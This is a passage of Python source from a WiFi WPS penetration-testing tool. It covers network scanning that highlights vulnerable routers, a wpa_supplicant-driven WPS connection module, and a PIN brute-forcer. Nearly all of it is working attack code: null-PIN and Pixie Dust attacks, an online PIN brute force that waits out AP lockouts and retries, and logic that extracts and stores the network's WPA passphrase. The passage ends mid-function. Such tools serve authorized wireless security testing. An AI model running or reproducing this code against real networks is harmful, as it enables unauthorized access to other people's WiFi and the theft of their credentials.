_RE_WPS_LOCKED = re.compile(r' [*] AP setup locked: (0x[0-9]+)')
_RE_MODEL  = re.compile(r' [*] Model: (.*)')
_RE_MODEL_NUMBER = re.compile(r' [*] Model Number: (.*)')
_RE_DEVICE_NAME  = re.compile(r' [*] Device name: (.*)')

def classifyWpsState(network: dict) -> str:
    """Classify the WPS state of a scanned network.

    Returns one of:
      'enabled'  - AP advertises WPS (WPS IE present in beacon/probe response)
      'locked'   - WPS is enabled but the AP reports setup lock (temporary lockout)
      'disabled' - AP is present but does NOT advertise WPS (WPS disabled in firmware)
      'unknown'  - insufficient data
    """

    if network.get('WPS'):
        return 'locked' if network.get('WPS locked') else 'enabled'
    if network.get('BSSID'):
        return 'disabled'
    return 'unknown'

def probeWpsState(interface: str, bssid: str) -> dict | None:
    """Scan the air and report the over-the-air WPS state of a single BSSID.

    This runs a normal `iw scan` (the same active probing used by the scan flow)
    and extracts the target AP. It injects no frames and sends no WPS traffic of
    its own. Returns a parsed network dict, or None if the AP was not observed.
    """

    command = ['iw', 'dev', interface, 'scan']
    try:
        proc = subprocess.run(command,
            encoding='utf-8', stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            timeout=30
        )
    except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired) as error:
        logger.error(f'WPS capability probe failed: {error}')
        return None

    lines = proc.stdout.splitlines()

    if proc.returncode != 0 or any(line.startswith('command failed:') for line in lines):
        logger.error('WPS capability probe failed: iw scan returned an error')
        return None

    target = bssid.upper()
    network = {
        'BSSID': '',
        'ESSID': '',
        'Security type': 'Unknown',
        'WPS': False,
        'WPS version': '1.0',
        'WPS locked': False,
        'Model': '',
        'Model number': '',
        'Device name': ''
    }

    inside = False
    for raw_line in lines:
        line = raw_line.strip('\t')

        bss_match = _RE_BSS.match(line)
        if bss_match:
            inside = bss_match.group(1).upper() == target
            if inside:
                network['BSSID'] = bss_match.group(1).upper()
            continue

        if not inside:
            continue

        if _RE_WPS.match(line):
            network['WPS'] = True
        elif _RE_WPS_V2.match(line):
            if _RE_WPS_V2.match(line).group(1) == '2.0':
                network['WPS version'] = '2.0'
        elif _RE_WPS_LOCKED.match(line):
            network['WPS locked'] = bool(int(_RE_WPS_LOCKED.match(line).group(1), 16))
        elif _RE_SSID.match(line):
            try:
                d = _RE_SSID.match(line).group(1)
                essid = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
                network['ESSID'] = essid if essid.strip('\x00 ') else '<hidden>'
            except (AttributeError, IndexError):
                network['ESSID'] = '<hidden>'
        elif _RE_MODEL.match(line):
            network['Model'] = codecs.decode(_RE_MODEL.match(line).group(1), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
        elif _RE_MODEL_NUMBER.match(line):
            network['Model number'] = codecs.decode(_RE_MODEL_NUMBER.match(line).group(1), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
        elif _RE_DEVICE_NAME.match(line):
            network['Device name'] = codecs.decode(_RE_DEVICE_NAME.match(line).group(1), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

    if not network['BSSID']:
        return None
    return network


class WiFiScanner:
    """Handles parsing scan results and table."""

    def __init__(self, interface: str, vuln_list: str = None):
        self.INTERFACE = interface
        self.VULN_LIST = vuln_list

        reports_fname = REPORTS_DIR + 'stored.csv'

        try:
            # Look for already stored networks to highlight
            with open(reports_fname, 'r', newline='', encoding='utf-8') as file:
                csv_reader = csv.reader(file,
                    delimiter=';', quoting=csv.QUOTE_ALL
                )

                # Skip header
                next(csv_reader)
                self.STORED = []

                for row in csv_reader:
                    self.STORED.append(
                        (
                            row[1],   # BSSID
                            row[2]    # ESSID
                        )
                    )
        except FileNotFoundError:
            self.STORED = []

    def promptNetwork(self) -> tuple[str, dict] | None:
        """Prompts the user to select a network from the available WPS networks."""

        networks = self._iwScanner()

        if not networks:
            logger.error('No WPS networks found.')
            return

        while True:
            try:
                network_no = input('Select target (press Enter to refresh): ')

                if network_no.lower() in {'r', '0', ''}:
                    if args.clear:
                        src.utils.clearScreen()
                    result = self.promptNetwork()
                    if result is None:
                        continue
                    return result

                if int(network_no) in networks.keys():
                    selected_network = networks[int(network_no)]
                    return (selected_network['BSSID'], selected_network)

                raise IndexError
            except (IndexError, ValueError):
                logger.warning('Invalid number')

    def _iwScanner(self) -> dict[int, dict] | bool:
        """Parsing iw scan results."""

        def handleNetwork(_line, result, networks):
            networks.append(
                {
                    'ESSID': '',
                    'Security type': 'Unknown',
                    'WPS': False,
                    'WPS version': '1.0',
                    'WPS locked': False,
                    'Model': '',
                    'Model number': '',
                    'Device name': ''
                }
            )
            networks[-1]['BSSID'] = result.group(1).upper()

        def handleEssid(_line, result, networks):
            try:
                d = result.group(1)
                essid = networks[-1]['ESSID'] = codecs.decode(d,'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

                # Check if empty or only contains null/whitespace bytes
                networks[-1]['ESSID'] = essid if essid.strip('\x00 ') else '<hidden>'
            except (AttributeError, IndexError):
                networks[-1]['ESSID'] = '<hidden>'

        def handleLevel(_line, result, networks):
            networks[-1]['Level'] = int(float(result.group(1)))

        def handleSecurityType(_line, result, networks):
            sec = networks[-1]['Security type']
            if result.group(1) == 'capability':
                if 'Privacy' in result.group(2):
                    sec = 'WEP'
                else:
                    sec = 'Open'
            elif sec == 'WEP':
                if result.group(1) == 'RSN':
                    sec = 'WPA2'
                elif result.group(1) == 'WPA':
                    sec = 'WPA'
            elif sec == 'WPA':
                if result.group(1) == 'RSN':
                    sec = 'WPA/WPA2'
            elif sec == 'WPA2':
                if result.group(1) == 'PSK SAE':
                    sec = 'WPA2/WPA3'
                elif result.group(1) == 'WPA':
                    sec = 'WPA/WPA2'
            networks[-1]['Security type'] = sec

        def handleWps(_line, result, networks):
            networks[-1]['WPS'] = True

        def handleWpsVersion(_line, result, networks):
            wps_ver = networks[-1]['WPS version']

            # Only WPS 2.0 APs broadcast this, this way we can distinguish between 1.0<->2.0
            wps_ver_filtered = result.group(1).replace('* Version2:', '')

            if wps_ver_filtered == '2.0':
                wps_ver = '2.0'

            networks[-1]['WPS version'] = wps_ver

        def handleWpsLocked(_line, result, networks):
            flag = int(result.group(1), 16)
            if flag:
                networks[-1]['WPS locked'] = True

        def handleModel(_line, result, networks):
            d = result.group(1)
            networks[-1]['Model'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handleModelNumber(_line: str, result: str, networks: list):
            d = result.group(1)
            networks[-1]['Model number'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handleDeviceName(_line, result, networks):
            d = result.group(1)
            networks[-1]['Device name'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        networks = []
        matchers = {
            _RE_BSS: handleNetwork,
            _RE_SSID: handleEssid,
            re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handleLevel,
            re.compile(r'(capability): (.+)'): handleSecurityType,
            re.compile(r'(RSN):\t [*] Version: (\d+)'): handleSecurityType,
            re.compile(r'(WPA):\t [*] Version: (\d+)'): handleSecurityType,
            _RE_WPS: handleWps,
            _RE_WPS_V2: handleWpsVersion,
            re.compile(r' [*] Authentication suites: (.+)'): handleSecurityType,
            _RE_WPS_LOCKED: handleWpsLocked,
            _RE_MODEL: handleModel,
            _RE_MODEL_NUMBER: handleModelNumber,
            _RE_DEVICE_NAME: handleDeviceName
        }

        command = ['iw', 'dev', f'{self.INTERFACE}', 'scan']
        try:
            iw_scan_process = subprocess.run(command,
                encoding='utf-8', stdout=subprocess.PIPE, stderr=subprocess.STDOUT
            )
        except (subprocess.CalledProcessError, FileNotFoundError) as error:
            logger.error(f'Failed to perform an iw scan: \n {error}')
            return

        lines = iw_scan_process.stdout.splitlines()

        if args.verbose:
            print('\n'.join(lines))

        for line in lines:
            if line.startswith('command failed:'):
                logger.error(f'Error: {line}')
                return False

            line = line.strip('\t')

            for regexp, handler in matchers.items():
                res = re.match(regexp, line)
                if res:
                    handler(line, res, networks)

        # By default only WPS networks are shown; with --all, WPS-disabled APs
        # are listed too (marked gray / 'OFF') so the user can spot them
        if not args.all:
            networks = list(filter(lambda x: bool(x['WPS']), networks))

            if not networks:
                return False

        # Sorting by signal level
        networks.sort(key=lambda x: x['Level'], reverse=True)

        # Putting a list of networks in a dictionary, where each key is a network number in list of networks
        network_list = {(i + 1): network for i, network in enumerate(networks)}
        network_list_items = list(network_list.items())

        def truncateStr(s: str | None, length: int, postfix='…') -> str:
            """Truncate string with the specified length."""

            if len(s) > length:
                k = length - len(postfix)
                s = s[:k] + postfix
            return s

        def colored(text: str, color: str) -> str:
            """Returns colored text"""

            if color:
                if color == 'green':
                    text = f'\033[1m\033[92m{text}\033[00m'
                if color == 'dark_green':
                    text = f'\033[32m{text}\033[00m'
                elif color == 'red':
                    text = f'\033[1m\033[91m{text}\033[00m'
                elif color == 'yellow':
                    text = f'\033[1m\033[93m{text}\033[00m'
                elif color == 'gray':
                    text = f'\033[90m{text}\033[00m'
                else:
                    return text
            else:
                return text
            return text

        print('Network marks: {1} {0} {2} {0} {3} {0} {4} {0} {5}'.format(
            '|',
            colored('Vulnerable model', color='green'),
            colored('Vulnerable WPS ver.', color='dark_green'),
            colored('WPS locked', color='red'),
            colored('Already stored', color='yellow'),
            colored('WPS disabled', color='gray')
        ))

        def entryMaxLength(item: str, max_length=27) -> int:
            """Calculates max length of network_list_items entry"""

            lengths = [len(entry[1].get(item, '')) for entry in network_list_items]
            return min(max(lengths), max_length) + 1

        # Used to calculate the max width of a collum in the network list table
        columm_lengths = {
            '#': 4,
            'sec': entryMaxLength('Security type'),
            'bssid': 18,
            'essid': entryMaxLength('ESSID'),
            'name': entryMaxLength('Device name'),
            'model': entryMaxLength('Model')
        }

        row = '{:<{#}} {:<{bssid}} {:<{essid}} {:<{sec}} {:<{#}} {:<{#}} {:<{name}} {:<{model}}'

        print(row.format(
            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'Ver.', 'WSC name', 'WSC model',
            **columm_lengths
        ))

        if args.reverse_scan:
            network_list_items = network_list_items[::-1]
        for n, network in network_list_items:
            # (FOR COMPATIBILITY) pylint: disable=inconsistent-quotes
            model = f'{network["Model"]} {network["Model number"]}'
            essid = truncateStr(network['ESSID'], 25)
            device_name = truncateStr(network['Device name'], 27)
            number = f'{n})'
            wps_ver = network['WPS version'] if network['WPS'] else 'OFF'
            line = row.format(
                number, network['BSSID'], essid,
                network['Security type'], network['Level'],
                wps_ver, device_name, model,
                **columm_lengths
            )
            if (network['BSSID'], network['ESSID']) in self.STORED:
                print(colored(line, color='yellow'))
            elif not network['WPS']:
                print(colored(line, color='gray'))
            elif network['WPS version'] == '1.0':
                print(colored(line, color='dark_green'))
            elif network['WPS locked']:
                print(colored(line, color='red'))
            elif self.VULN_LIST and (model in self.VULN_LIST) or (device_name in self.VULN_LIST):
                print(colored(line, color='green'))
            else:
                print(line)

        return network_list


# ============================================================================
# SOURCE: src/wps/connection.py
# ============================================================================
#  OneShot-Extended (WPS penetration testing utility) is a fork of the tool with extra features
#  Copyright (C) 2026 chkndrp
#
#  This program is free software; you can redistribute it and/or
#  modify it under the terms of the GNU General Public License
#  as published by the Free Software Foundation; either version 2
#  of the License, or (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.

import socket
import tempfile
import os
import subprocess
import time
import shutil
import codecs

import src.wps.pixiewps
import src.wps.generator
import src.utils
import src.wifi.collector
import src.args

from src import logger

args = None  # Set in main()

class ConnectionStatus:
    """Stores WPS connection details and status."""

    def __init__(self):
        self.STATUS = '' # Must be WSC_NACK, WPS_FAIL, WPS_TIMEOUT or GOT_PSK
        self.LAST_M_MESSAGE = 0
        self.ESSID = ''
        self.BSSID = ''
        self.WPA_PSK = ''
        self.IS_LOCKED = False

    def isFirstHalfValid(self) -> bool:
        """Checks if the first half of the PIN is valid."""
        return self.LAST_M_MESSAGE > 5

    def clear(self):
        """Resets the connection status variables."""
        self.__init__()

class Initialize:
    """WPS connection"""

    def __init__(self, interface: str):
        self.INTERFACE = interface

        self.CONNECTION_STATUS = ConnectionStatus()
        self.PIXIE_CREDS  = src.wps.pixiewps.Data()

        self.TEMPDIR = tempfile.mkdtemp()

        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
            temp.write(f'ctrl_interface={self.TEMPDIR}\nctrl_interface_group=root\nupdate_config=1\n')
            self.TEMPCONF = temp.name

        self.WPAS_CTRL_PATH = f'{self.TEMPDIR}/{self.INTERFACE}'
        self._initWpaSupplicant()

        self.RES_SOCKET_FILE = f'{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}'
        self.RETSOCK = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.RETSOCK.bind(self.RES_SOCKET_FILE)

        self.DISCONNECT_COUNT = 0

    @staticmethod
    def _getHex(line: str) -> str:
        """Filters WPA Supplicant output, and removes whitespaces"""

        a = line.split(':', 3)
        return a[2].replace(' ', '').upper()

    @staticmethod
    def _explainWpasNotOkStatus(command: str, respond: str):
        """Outputs details about WPA supplicant errors"""

        if command.startswith(('WPS_REG', 'WPS_PBC')):
            if respond == 'UNKNOWN COMMAND':
                return ('[!] It looks like your wpa_supplicant is compiled without WPS protocol support. '
                        'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')
        return '[!] Something went wrong — check out debug log'

    @staticmethod
    def _credentialPrint(wps_pin: str = None, wpa_psk: str = None, essid: str = None):
        """Prints network credentials after success"""

        logger.success(f'WPS PIN: \'{wps_pin}\'')
        logger.success(f'WPA PSK: \'{wpa_psk}\'')
        logger.success(f'AP SSID: \'{essid}\'')

    def singleConnection(self, bssid: str = None, pin: str = None, pbc_mode: bool = False, store_pin_on_fail: bool = False) -> bool:
        """        
        Establish a WPS connection, using a pin, a calculated pin (if in pixiemode), a PIN
        generated from a list of likely PINs, PBC mode, or null pin. handles pixiedust
        attacks if enabled and manages storing PINs on connection failure
        """

        pixiewps_dir = src.utils.PIXIEWPS_DIR
        generator    = src.wps.generator.WPSpin()
        collector    = src.wifi.collector.WiFiCollector()

        # Handle null pin attack
        if args.null_pin:
            pin = '00000000'
        elif pin is None:
            if args.pixie_dust:
                try:
                    filename = f'''{pixiewps_dir}{bssid.replace(':', '').upper()}.run'''

                    with open(filename, 'r', encoding='utf-8') as file:
                        t_pin = file.readline().strip()
                        if input(f'[?] Use previously calculated PIN {t_pin}? [n/Y] ').lower() != 'n':
                            pin = t_pin
                        else:
                            raise FileNotFoundError
                except FileNotFoundError:
                    pin = generator.getLikely(bssid) or '12345670'
            elif not pbc_mode:
                # If not pixiemode, ask user to select a pin from the list
                pin = generator.promptPin(bssid) or '12345670'

        if pbc_mode:
            self._wpsConnection(bssid, pbc_mode=pbc_mode)
            bssid = self.CONNECTION_STATUS.BSSID
            pin = '<PBC mode>'
        elif store_pin_on_fail:
            try:
                self._wpsConnection(bssid, pin, retry_on_lock=True)
            except KeyboardInterrupt:
                logger.info('Aborting…')
                collector.writePin(bssid, pin)
                return False
        else:
            self._wpsConnection(bssid, pin, retry_on_lock=True)

        if self.CONNECTION_STATUS.STATUS == 'GOT_PSK':
            self._credentialPrint(pin, self.CONNECTION_STATUS.WPA_PSK, self.CONNECTION_STATUS.ESSID)
            if args.write:
                collector.writeResult(bssid, self.CONNECTION_STATUS.ESSID, pin, self.CONNECTION_STATUS.WPA_PSK)
            if not pbc_mode:
                # Try to remove temporary PIN file
                try:
                    filename = f'''{pixiewps_dir}{bssid.replace(':', '').upper()}.run'''
                    os.remove(filename)
                except FileNotFoundError:
                    pass
            return True
        if args.pixie_dust:
            if self.PIXIE_CREDS.getAll():
                pin = self.PIXIE_CREDS.runPixieWps(args.show_pixie, args.pixie_force)
                if pin:
                    return self.singleConnection(bssid, pin, store_pin_on_fail=True)
                return False

            logger.error('Not enough data to run Pixie Dust attack')
            return False

        if store_pin_on_fail:
            # Saving Pixiewps calculated PIN if can't connect
            collector.writePin(bssid, pin)
        return False

    def _initWpaSupplicant(self):
        """Initializes wpa_supplicant with the specified configuration"""

        logger.info('Running wpa_supplicant…')

        wpa_supplicant_cmd = ['wpa_supplicant']
        wpa_supplicant_cmd.extend([
            '-K', '-d',
            '-Dnl80211,wext,hostapd,wired',
            f'-i{self.INTERFACE}',
            f'-c{self.TEMPCONF}'
        ])

        try:
            self.WPAS = subprocess.Popen(wpa_supplicant_cmd,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                encoding='utf-8'
            )
        except (subprocess.CalledProcessError, FileNotFoundError) as error:
            logger.error(f'Failed to open wpa_supplicant \n {error}')
            return

        # Waiting for wpa_supplicant control interface initialization
        while True:
            ret = self.WPAS.poll()

            if ret is not None and ret != 0:
                logger.error(f'wpa_supplicant returned an error: \n {self.WPAS.communicate()[0]}')
            if os.path.exists(self.WPAS_CTRL_PATH):
                break

            time.sleep(.1)

    def _sendAndReceive(self, command: str) -> str:
        """Sends command to wpa_supplicant and returns the reply"""

        self.RETSOCK.sendto(command.encode(), self.WPAS_CTRL_PATH)

        (b, _address) = self.RETSOCK.recvfrom(4096)
        inmsg = b.decode('utf-8', errors='replace')
        return inmsg

    def _sendOnly(self, command: str):
        """Sends command to wpa_supplicant without reply"""

        self.RETSOCK.sendto(command.encode(), self.WPAS_CTRL_PATH)

    def _handleWpas(self, pbc_mode: bool = False) -> bool:
        """Handles WPA supplicant output and updates connection status"""

        line = self.WPAS.stdout.readline()

        if not line:
            self.WPAS.wait()
            return False

        line = line.rstrip('\n')

        if args.verbose:
            print(line)

        # Handle WPS protocol messages
        if line.startswith('WPS: '):
            return self._handle_wps_messages(line)

        # Handle connection state changes
        return self._handle_connection_states(line, pbc_mode)

    def _handle_wps_messages(self, line: str) -> bool:
        """Handle WPS-specific protocol messages"""

        if 'M2D' in line:
            logger.warning('Received WPS Message M2D')

            self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
            self.CONNECTION_STATUS.IS_LOCKED = True

            logger.error('This AP is not accepting PINs right now without configuration')
            return False

        if 'Building Message M' in line:
            n = int(line.split('Building Message M')[1])
            self.CONNECTION_STATUS.LAST_M_MESSAGE = n
            logger.info(f'Sending WPS Message M{n}…')

        elif 'Received M' in line:
            n = int(line.split('Received M')[1])
            self.CONNECTION_STATUS.LAST_M_MESSAGE = n
            logger.success(f'Received WPS Message M{n}')
            if n == 5:
                logger.info('The first half of the PIN is valid')

        elif 'Received WSC_NACK' in line:
            self.CONNECTION_STATUS.STATUS = 'WSC_NACK'
            logger.warning('Received WSC NACK')

            if self.CONNECTION_STATUS.LAST_M_MESSAGE < 3:
                self.CONNECTION_STATUS.IS_LOCKED = True
                return False

            logger.error('Error: wrong PIN code')

        elif 'Enrollee Nonce' in line and 'hexdump' in line:
            self._handle_pixie_data('E_NONCE', line, 16 * 2)

        elif 'Registrar Nonce' in line and 'hexdump' in line:
            self._handle_pixie_data('R_NONCE', line, 16 * 2)

        elif 'DH own Public Key' in line and 'hexdump' in line:
            self._handle_pixie_data('PKR', line, 192 * 2)

        elif 'DH peer Public Key' in line and 'hexdump' in line:
            self._handle_pixie_data('PKE', line, 192 * 2)

        elif 'AuthKey' in line and 'hexdump' in line:
            self._handle_pixie_data('AUTHKEY', line, 32 * 2)

        elif 'E-Hash1' in line and 'hexdump' in line:
            self._handle_pixie_data('E_HASH1', line, 32 * 2)

        elif 'E-Hash2' in line and 'hexdump' in line:
            self._handle_pixie_data('E_HASH2', line, 32 * 2)

        elif 'Network Key' in line and 'hexdump' in line:
            self.CONNECTION_STATUS.STATUS = 'GOT_PSK'
            self.CONNECTION_STATUS.WPA_PSK = bytes.fromhex(self._getHex(line)).decode('utf-8', errors='replace')

        return True

    def _handle_connection_states(self, line: str, pbc_mode: bool) -> bool:
        """Handle various connection state changes"""

        if ': State: ' in line and '-> SCANNING' in line:
            self.CONNECTION_STATUS.STATUS = 'scanning'
            logger.info('Scanning…')

        elif ('WPS-FAIL' in line) and (self.CONNECTION_STATUS.STATUS != ''):
            self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
            logger.warning('wpa_supplicant returned WPS-FAIL')

        elif 'Trying to authenticate with' in line:
            self.CONNECTION_STATUS.STATUS = 'authenticating'
            if 'SSID' in line:
                self.CONNECTION_STATUS.ESSID = self._decode_essid(line)
            logger.info('Authenticating…')

        elif 'Authentication response' in line:
            logger.success('Authenticated')

        elif 'Trying to associate with' in line:
            self.CONNECTION_STATUS.STATUS = 'associating'
            if 'SSID' in line:
                self.CONNECTION_STATUS.ESSID = self._decode_essid(line)
            logger.info('Associating with AP…')

        elif ('Associated with' in line) and (self.INTERFACE in line):
            bssid = line.split()[-1].upper()
            if self.CONNECTION_STATUS.ESSID:
                logger.success(f'Associated with {bssid} (ESSID: {self.CONNECTION_STATUS.ESSID})')
            else:
                logger.success(f'Associated with {bssid}')

        elif 'EAPOL: txStart' in line:
            self.CONNECTION_STATUS.STATUS = 'eapol_start'
            logger.info('Sending EAPOL Start…')

        elif 'EAP entering state IDENTITY' in line:
            logger.success('Received Identity Request')

        elif 'using real identity' in line:
            logger.info('Sending Identity Response…')

        elif 'WPS-TIMEOUT' in line:
            self.CONNECTION_STATUS.STATUS = 'WPS_TIMEOUT'

        elif 'NL80211_CMD_DEL_STATION' in line:
            self.DISCONNECT_COUNT += 1
            if self.DISCONNECT_COUNT == 5:
                logger.warning('Received NL80211 DEL_STATION too many times 🠋')
                logger.warning('This could be the result of interference, or the AP is really far')

        elif pbc_mode and ('selected BSS ' in line):
            bssid = line.split('selected BSS ')[-1].split()[0].upper()
            self.CONNECTION_STATUS.BSSID = bssid
            logger.info(f'Selected AP: {bssid}')

        return True

    def _handle_pixie_data(self, attr: str, line: str, expected_len: int):
        """Handle pixie dust attack related data"""
        hex_value = self._getHex(line)
        if len(hex_value) != expected_len:
            raise ValueError(f'Invalid {attr} length: expected {expected_len}, got {len(hex_value)}')
        setattr(self.PIXIE_CREDS, attr, hex_value)

        if args.show_pixie:
            logger.info(f'{attr}: {hex_value}')

    def _decode_essid(self, line: str) -> str:
        """Decode ESSID from wpa_supplicant output"""
        return codecs.decode(
            '\''.join(line.split('\'')[1:-1]),
            'unicode-escape'
        ).encode('latin1').decode('utf-8', errors='replace')

    def _wpsConnection(self, bssid: str = None, pin: str = None,
        pbc_mode: bool = False, retry_on_lock: bool = False) -> bool:
        """Handles WPS connection process"""

        timeout_count = 0
        ever_m = False

        while True:
            self.PIXIE_CREDS.clear()
            self.CONNECTION_STATUS.clear()
            self.WPAS.stdout.read(300) # Clean the pipe

            wps_start_time = time.time()

            if pbc_mode:
                if bssid:
                    logger.info(f'Starting WPS push button connection to {bssid}…')
                    cmd = f'WPS_PBC {bssid}'
                else:
                    logger.info('Starting WPS push button connection…')
                    cmd = 'WPS_PBC'
            else:
                logger.info(f'Trying PIN \'{pin}\'…')
                cmd = f'WPS_REG {bssid} {pin}'

            if bssid:
                self.PIXIE_CREDS.BSSID = bssid.upper()

            r = self._sendAndReceive(cmd)

            if 'OK' not in r:
                self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
                logger.error(self._explainWpasNotOkStatus(cmd, r))
                return False

            while True:
                if not src.utils.isInterfaceUp(self.INTERFACE):
                    logger.error(f'Interface {self.INTERFACE} is no longer UP. Aborting connection attempt.')
                    self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
                    break

                res = self._handleWpas(pbc_mode=pbc_mode)

                if self.CONNECTION_STATUS.LAST_M_MESSAGE > 0:
                    ever_m = True

                if not res or self.CONNECTION_STATUS.STATUS in {'WSC_NACK', 'GOT_PSK', 'WPS_FAIL'}:
                    break

                if self.CONNECTION_STATUS.STATUS == 'WPS_TIMEOUT':
                    elapsed = int(time.time() - wps_start_time)
                    timeout_count += 1

                    if timeout_count >= 3 and not ever_m:
                        logger.error('AP never responded to WPS after multiple attempts. '
                                     'WPS is likely disabled in its firmware (or the AP is out of range)')
                        self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
                        break

                    logger.warning(f'Received WPS-timeout after {elapsed} seconds')

                    try:
                        self.WPAS.terminate()
                        self.WPAS.wait(timeout=2)
                    except subprocess.TimeoutExpired:
                        self.WPAS.kill()

                    self._initWpaSupplicant()
                    time.sleep(1) # Brief delay before retry

                    # Resend the WPS command
                    r = self._sendAndReceive(cmd)
                    if 'OK' not in r:
                        self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
                        logger.error(self._explainWpasNotOkStatus(cmd, r))
                        return False

                    self.CONNECTION_STATUS.clear()
                    continue

            self._sendOnly('WPS_CANCEL')

            if retry_on_lock and self.CONNECTION_STATUS.IS_LOCKED:
                logger.warning(f'{bssid} is WPS LOCKED. Retrying in {args.timeout}s…')
                time.sleep(args.timeout)
                continue

            return self.CONNECTION_STATUS.STATUS == 'GOT_PSK'

    def _cleanup(self):
        """Terminates connections and removes temporary files"""

        try:
            self.RETSOCK.close()
            if hasattr(self, 'WPAS'):
                self.WPAS.terminate()
                if self.WPAS.stdout:
                    self.WPAS.stdout.close()
                self.WPAS.wait()
        except OSError:
            pass

        if os.path.exists(self.RES_SOCKET_FILE):
            os.remove(self.RES_SOCKET_FILE)

        shutil.rmtree(self.TEMPDIR, ignore_errors=True)

        if os.path.exists(self.TEMPCONF):
            os.remove(self.TEMPCONF)

    def __del__(self):
        self._cleanup()


# ============================================================================
# SOURCE: src/wps/bruteforce.py
# ============================================================================
#  OneShot-Extended (WPS penetration testing utility) is a fork of the tool with extra features
#  Copyright (C) 2026 chkndrp
#
#  This program is free software; you can redistribute it and/or
#  modify it under the terms of the GNU General Public License
#  as published by the Free Software Foundation; either version 2
#  of the License, or (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.

import collections
import statistics
import time

from datetime import datetime
from src import logger

import src.wps.generator
import src.wps.connection
import src.utils
import src.args

args = None  # Set in main()

class BruteforceStatus:
    """Stores bruteforce details and status."""

    def __init__(self):
        self.START_TIME = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        self.MASK = ''
        self.LAST_ATTEMPT_TIME = time.time() # Last PIN attempt start time
        self.ATTEMPTS_TIMES = collections.deque(maxlen=15)

        self.COUNTER = 0
        self.STATISTICS_PERIOD = 5

    def displayStatus(self):
        """
        Displays the current status of the brute force process, including the 
        percentage of completion, start time, and average time per PIN attempt.
        """
        average_pin_time = statistics.mean(self.ATTEMPTS_TIMES)

        if len(self.MASK) == 4:
            percentage = int(self.MASK) / 11000 * 100
        else:
            percentage = ((10000 / 11000) + (int(self.MASK[4:]) / 11000)) * 100

        logger.info('{:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(
            percentage, self.START_TIME, average_pin_time
        ))

    def registerAttempt(self, mask: str):
        """
        Registers an attempt with the given mask, updates the attempt counter,
        records the time taken since the last attempt, and displays status if
        the counter reaches the statistics period.
        """
        current_time = time.time()

        self.MASK = mask
        self.COUNTER += 1
        self.ATTEMPTS_TIMES.append(current_time - self.LAST_ATTEMPT_TIME)
        self.LAST_ATTEMPT_TIME = current_time

        if self.COUNTER == self.STATISTICS_PERIOD:
            self.COUNTER = 0
            self.displayStatus()

class Initialize:
    """Handles bruteforce"""

    def __init__(self, interface: str):
        self.BRUTEFORCE_STATUS = BruteforceStatus()
        self.CONNECTION_STATUS = src.wps.connection.ConnectionStatus()
        self.GENERATOR  = src.wps.generator.WPSpin()
        self.CONNECTION = src.wps.connection.Initialize(
            interface
        )

    def _firstHalfBruteforce(self, bssid: str, first_half: str) -> str | bool:
        """Attempts to bruteforce the first half of a WPS PIN"""

        checksum = self.GENERATOR.checksum

        while int(first_half) < 10000:
            if not src.utils.isInterfaceUp(self.CONNECTION.INTERFACE):
                logger.error(f'Interface {self.CONNECTION.INTERFACE} is no longer UP. Aborting bruteforce.')
                return False

            t = int(first_half + '000')
            pin = f'{first_half}000{checksum(t)}'

            self.CONNECTION.singleConnection(bssid, pin)

            if self.CONNECTION.CONNECTION_STATUS.IS_LOCKED:
                logger.warning(f'{bssid} is WPS LOCKED. Retrying PIN {pin} in {args.timeout}s…')
                time.sleep(args.timeout)
                continue

            if self.CONNECTION.CONNECTION_STATUS.isFirstHalfValid():
                logger.info('First half found')
                return first_half

            if self.CONNECTION.CONNECTION_STATUS.STATUS == 'WPS_FAIL':
                logger.warning('WPS transaction failed, re-trying last pin')
                return self._firstHalfBruteforce(bssid, first_half)

            first_half = str(int(first_half) + 1).zfill(4)
            self.BRUTEFORCE_STATUS.registerAttempt(first_half)

            if args.delay:
                time.sleep(args.delay)

        logger.warning('First half not found')
        return False

    def _secondHalfBruteforce(self, bssid: str, first_half: str, second_half: str) -> str | bool:
        """Attempts to bruteforce the second half of a WPS PIN"""

        checksum = self.GENERATOR.checksum

        while int(second_half) < 1000:
            if not src.utils.isInterfaceUp(self.CONNECTION.INTERFACE):
                logger.error(f'Interface {self.CONNECTION.INTERFACE} is no longer UP. Aborting bruteforce.')
                return False

            t = int(first_half + second_half)
            pin = f'{first_half}{second_half}{checksum(t)}'

            self.CONNECTION.singleConnection(bssid, pin)

            if self.CONNECTION.CONNECTION_STATUS.IS_LOCKED:
                logger.warning(f'{bssid} is WPS LOCKED. Retrying PIN {pin} in {args.timeout}s…')
                time.sleep(args.timeout)
                continue

            if self.CONNECTION.CONNECTION_STATUS.LAST_M_MESSAGE > 6:
                return pin

